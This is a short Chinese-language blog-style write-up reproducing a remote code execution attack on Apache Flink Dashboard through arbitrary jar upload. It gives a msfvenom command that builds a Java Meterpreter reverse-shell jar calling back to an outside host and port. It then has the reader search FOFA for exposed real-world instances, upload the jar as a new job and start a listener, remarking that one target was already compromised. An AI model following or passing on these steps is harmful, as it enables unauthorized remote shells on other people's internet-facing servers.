# Apache Flink RCE 复现

## 简介

Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。攻击者可直接在Apache Flink Dashboard页面中上传任意jar包，从而达到远程代码执行的目的。

## 复现

先用msf生成jar包：

```
1.  `msfvenom -p java/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f jar > nakumura.jar`
    
```

随便上fofa上找几个测试下，挺多的。

![](../Images/8fb3af702b2ac886bba4290177c0dc3e.png)

然后点开一个，点 submit new job。

![](../Images/b2668af96146f7b7f240ad41764823cb.png)

emmm，已经被人玩坏了，点下add new+，上传jar包,然后submit一下就可以执行。。![](../Images/20afb2de188368c6b2a184d1cdba62ef.png)执行前记得先开启msf的监听。  

submit一下,返回。
